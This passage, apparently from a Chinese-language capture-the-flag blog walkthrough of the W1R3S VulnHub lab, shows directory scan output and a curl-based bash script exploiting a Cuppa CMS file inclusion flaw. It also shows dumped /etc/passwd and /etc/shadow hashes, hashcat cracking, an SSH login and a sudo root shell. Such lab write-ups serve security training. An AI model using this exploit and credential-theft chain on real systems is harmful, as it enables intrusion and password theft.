http://192.168.66.7/administrator/components/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/extensions/                                          </span><br><span class="line">+ http://192.168.66.7/administrator/index.php (CODE:302|SIZE:6946)                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/installation/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/js/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/language/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/media/                                               </span><br><span class="line">+ http://192.168.66.7/administrator/robots.txt (CODE:200|SIZE:26)                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/templates/                                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/javascript/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/javascript/jquery/                                                 </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/index.php (CODE:200|SIZE:55879)                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-content/                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-includes/                                             </span><br><span class="line">+ http://192.168.66.7/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                         </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/alerts/ ----</span><br><span class="line">+ http://192.168.66.7/administrator/alerts/index.html (CODE:200|SIZE:31)                              </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/api/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/api/administrator/                                   </span><br><span class="line">+ http://192.168.66.7/administrator/api/index.php (CODE:200|SIZE:62)                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/api/test/                                            </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/classes/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/classes/ajax/                                        </span><br><span class="line">+ http://192.168.66.7/administrator/classes/index.html (CODE:200|SIZE:31)                             </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/components/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/configuration/                            </span><br><span class="line">+ http://192.168.66.7/administrator/components/index.html (CODE:200|SIZE:31)                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/menu/                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/stats/                                    </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/extensions/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/extensions/banners/                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/extensions/content/                                  </span><br><span class="line">+ http://192.168.66.7/administrator/extensions/index.html (CODE:200|SIZE:31)                          </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/installation/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/installation/html/                                   </span><br><span class="line">+ http://192.168.66.7/administrator/installation/index.php (CODE:200|SIZE:4322)                       </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/js/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/js/filemanager/                                      </span><br><span class="line">+ http://192.168.66.7/administrator/js/index.html (CODE:200|SIZE:31)                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/js/jquery/                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/js/tiny_mce/                                         </span><br><span class="line">                                                                                                      </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/templates/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/templates/default/                                   </span><br><span class="line">+ http://192.168.66.7/administrator/templates/index.html (CODE:200|SIZE:31)                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/javascript/jquery/ ----</span><br><span class="line">+ http://192.168.66.7/javascript/jquery/jquery (CODE:200|SIZE:284394)                                 </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/wp-admin/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/css/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/images/                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/includes/                                       </span><br><span class="line">+ http://192.168.66.7/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/js/                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/maint/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/network/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-admin/user/                                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/wp-content/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-content/plugins/                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-content/themes/                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-content/upgrade/                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/wordpress/wp-content/uploads/                                      </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/components/configuration/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/configuration/html/                       </span><br><span class="line">+ http://192.168.66.7/administrator/components/configuration/index.php (CODE:200|SIZE:45)             </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/components/menu/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/menu/classes/                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/components/menu/html/                                </span><br><span class="line">+ http://192.168.66.7/administrator/components/menu/index.php (CODE:200|SIZE:45)                      </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/components/stats/ ----</span><br><span class="line">+ http://192.168.66.7/administrator/components/stats/index.php (CODE:200|SIZE:45)                                                                                                                                                                                                                                </span><br><span class="line">---- Entering directory: http://192.168.66.7/administrator/templates/default/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/templates/default/classes/                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/templates/default/css/                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/templates/default/html/                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.7/administrator/templates/default/images/                            </span><br><span class="line">+ http://192.168.66.7/administrator/templates/default/index.php (CODE:500|SIZE:0)                     </span><br><span class="line">                                                                                                                                                                                                           </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                          </span><br><span class="line">+ http://192.168.66.7/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                          </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                             </span><br><span class="line">+ http://192.168.66.7/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                             </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                        </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.66.7/wordpress/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.66.7/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)</span><br></pre></td></tr></table></figure>
+
+<p>administrator目录原来是Cuppa CMS的安装设置。这是将浏览器指向&#x2F;administrator时呈现出的页面。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub129.jpg"></p>
+<p>根据官方文档，为了完成安装，必须首先创建数据库。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remember, the database should be created before to install Cuppa CMS.</span><br></pre></td></tr></table></figure>
+
+<p>首先，Cuppa CMS安装未完成，否则将看不到设置页面。下载了Cuppa CMS代码的副本，以查看是否可以发现任何漏洞。不确定这是否是新漏洞，但在第77行的alertConfigField.php中找到一个LFI漏洞令人惊喜。</p>
+<p><img src="https://hackso.me/assets/images/posts/w1r3s-1.0.1-walkthrough/screenshot-2.png"></p>
+<p>为了测试它，编写了cat.sh，一个简单的脚本，只要有权限，它就会显示任何文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">_HOST=192.168.66.7</span><br><span class="line">_PATH=administrator/alerts/alertConfigField.php</span><br><span class="line">_PARM=urlConfig</span><br><span class="line">_TRAV=../../../../../../../..</span><br><span class="line"></span><br><span class="line">curl -s --data-urlencode <span class="string">&quot;<span class="variable">$&#123;_PARM&#125;</span>=<span class="variable">$&#123;_TRAV&#125;</span><span class="variable">$1</span>&quot;</span> <span class="variable">$_HOST</span>/<span class="variable">$_PATH</span> \</span><br><span class="line">| sed -r <span class="string">&#x27;s/^ &#123;8&#125;//&#x27;</span> \</span><br><span class="line">| sed <span class="string">&#x27;71,$!d&#x27;</span> \</span><br><span class="line">| sed <span class="string">&#x27;$d&#x27;</span> \</span><br><span class="line">| sed <span class="string">&#x27;$d&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./cat.sh /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">messagebus:x:106:110::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:107:111::/run/uuidd:/bin/false</span><br><span class="line">lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false</span><br><span class="line">whoopsie:x:109:117::/nonexistent:/bin/false</span><br><span class="line">avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false</span><br><span class="line">avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false</span><br><span class="line">hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false</span><br><span class="line">pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false</span><br><span class="line">rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false</span><br><span class="line">saned:x:119:127::/var/lib/saned:/bin/false</span><br><span class="line">usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false</span><br><span class="line">w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash</span><br><span class="line">sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false</span><br><span class="line">mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">root@kali:~<span class="comment"># ./cat.sh /etc/shadow</span></span><br><span class="line">root:$6$vYcecPCy<span class="variable">$JNbK</span>.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">daemon:*:17379:0:99999:7:::</span><br><span class="line">bin:*:17379:0:99999:7:::</span><br><span class="line">sys:*:17379:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:17379:0:99999:7:::</span><br><span class="line">games:*:17379:0:99999:7:::</span><br><span class="line">man:*:17379:0:99999:7:::</span><br><span class="line">lp:*:17379:0:99999:7:::</span><br><span class="line">mail:*:17379:0:99999:7:::</span><br><span class="line">news:*:17379:0:99999:7:::</span><br><span class="line">uucp:*:17379:0:99999:7:::</span><br><span class="line">proxy:*:17379:0:99999:7:::</span><br><span class="line">www-data:$6$8JMxE7l0<span class="variable">$yQ16jM</span>..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">backup:*:17379:0:99999:7:::</span><br><span class="line">list:*:17379:0:99999:7:::</span><br><span class="line">irc:*:17379:0:99999:7:::</span><br><span class="line">gnats:*:17379:0:99999:7:::</span><br><span class="line">nobody:*:17379:0:99999:7:::</span><br><span class="line">systemd-timesync:*:17379:0:99999:7:::</span><br><span class="line">systemd-network:*:17379:0:99999:7:::</span><br><span class="line">systemd-resolve:*:17379:0:99999:7:::</span><br><span class="line">systemd-bus-proxy:*:17379:0:99999:7:::</span><br><span class="line">syslog:*:17379:0:99999:7:::</span><br><span class="line">_apt:*:17379:0:99999:7:::</span><br><span class="line">messagebus:*:17379:0:99999:7:::</span><br><span class="line">uuidd:*:17379:0:99999:7:::</span><br><span class="line">lightdm:*:17379:0:99999:7:::</span><br><span class="line">whoopsie:*:17379:0:99999:7:::</span><br><span class="line">avahi-autoipd:*:17379:0:99999:7:::</span><br><span class="line">avahi:*:17379:0:99999:7:::</span><br><span class="line">dnsmasq:*:17379:0:99999:7:::</span><br><span class="line">colord:*:17379:0:99999:7:::</span><br><span class="line">speech-dispatcher:!:17379:0:99999:7:::</span><br><span class="line">hplip:*:17379:0:99999:7:::</span><br><span class="line">kernoops:*:17379:0:99999:7:::</span><br><span class="line">pulse:*:17379:0:99999:7:::</span><br><span class="line">rtkit:*:17379:0:99999:7:::</span><br><span class="line">saned:*:17379:0:99999:7:::</span><br><span class="line">usbmux:*:17379:0:99999:7:::</span><br><span class="line">w1r3s:$6<span class="variable">$xe</span>/eyoTx<span class="variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:17567:0:99999:7:::</span><br><span class="line">sshd:*:17554:0:99999:7:::</span><br><span class="line">ftp:*:17554:0:99999:7:::</span><br><span class="line">mysql:!:17554:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>可以看到&#x2F;etc&#x2F;shadow中有3个用户有密码hash，将hash值取出来放到hashcat中破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$6$vYcecPCy<span class="variable">$JNbK</span>.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0</span><br><span class="line">$6$8JMxE7l0<span class="variable">$yQ16jM</span>..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1</span><br><span class="line">$6<span class="variable">$xe</span>/eyoTx<span class="variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.</span><br></pre></td></tr></table></figure>
+
+<p>没办法，电脑GPU强，hashcat加载rockyou.txt字典几分钟就把3个hash值破解完了。。。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub130.jpg"></p>
+<p>3个hash值里面，只有一个hash被破解出来了。。。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\hashcat-5.1.0\hashcat-5.1.0&gt;hashcat64.exe -m 1800 password.txt --show</span><br><span class="line">$6<span class="variable">$xe</span>/eyoTx<span class="variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:computer</span><br></pre></td></tr></table></figure>
+
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>使用w1r3s&#x2F;computer连接ssh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh w1r3s@192.168.66.7</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.66.7 (192.168.66.7)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:/3N0PzPMqtXlj9QWJFMbCufh2W95JylZ/oF82NkAAto.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.66.7<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string">Think this is the way?</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string">Well,........possibly.</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string">w1r3s@192.168.66.7&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">228 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line">                                                                                   </span><br><span class="line">.....You made it huh?....                                                          </span><br><span class="line">Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35                             </span><br><span class="line">w1r3s@W1R3S:~$ <span class="built_in">id</span>                                                                           </span><br><span class="line">uid=1000(w1r3s) gid=1000(w1r3s) <span class="built_in">groups</span>=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br><span class="line">w1r3s@W1R3S:~$ <span class="built_in">whoami</span></span><br><span class="line">w1r3s</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>看到w1r3s在sudoers列表中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">w1r3s@W1R3S:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> w1r3s: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> w1r3s on W1R3S.localdomain:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User w1r3s may run the following commands on W1R3S.localdomain:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>
+
+<p>直接提权拿到flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">w1r3s@W1R3S:~$ sudo /bin/bash</span><br><span class="line">root@W1R3S:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@W1R3S:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@W1R3S:~<span class="comment"># cd /root</span></span><br><span class="line">root@W1R3S:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@W1R3S:/root<span class="comment"># cat flag.txt </span></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  </span><br><span class="line">  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| </span><br><span class="line"> | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ </span><br><span class="line"> | |__| |_| | |\  | |_| |  _ &lt;  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |</span><br><span class="line">  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ </span><br><span class="line">                                                                                        </span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">                          .-----------------TTTT_-----_______</span><br><span class="line">                        /<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span>(______O] ----------____  \______/]_</span><br><span class="line">     __...---<span class="string">&#x27;&quot;&quot;&quot;\_ --&#x27;</span><span class="string">&#x27;   Q                               ___________@</span></span><br><span class="line"><span class="string"> |&#x27;</span><span class="string">&#x27;&#x27;</span>                   ._   _______________=---------<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"> |                ..--&#x27;&#x27;|   l L |_l   |</span></span><br><span class="line"><span class="string"> |          ..--&#x27;&#x27;      .  /-___j &#x27;   &#x27;</span></span><br><span class="line"><span class="string"> |    ..--&#x27;&#x27;           /  ,       &#x27;   &#x27;</span></span><br><span class="line"><span class="string"> |--&#x27;&#x27;                /           `    \</span></span><br><span class="line"><span class="string">                      L__&#x27;         \    -</span></span><br><span class="line"><span class="string">                                    -    &#x27;-.</span></span><br><span class="line"><span class="string">                                     &#x27;.    /</span></span><br><span class="line"><span class="string">                                       &#x27;-./</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">  YOU HAVE COMPLETED THE</span></span><br><span class="line"><span class="string">               __      __  ______________________   _________</span></span><br><span class="line"><span class="string">              /  \    /  \/_   \______   \_____  \ /   _____/</span></span><br><span class="line"><span class="string">              \   \/\/   / |   ||       _/ _(__  &lt; \_____  \ </span></span><br><span class="line"><span class="string">               \        /  |   ||    |   \/       \/        \</span></span><br><span class="line"><span class="string">                \__/\  /   |___||____|_  /______  /_______  /.INC</span></span><br><span class="line"><span class="string">                     \/                \/       \/        \/        CHALLENGE, V 1.0</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------------------------</span></span><br><span class="line"><span 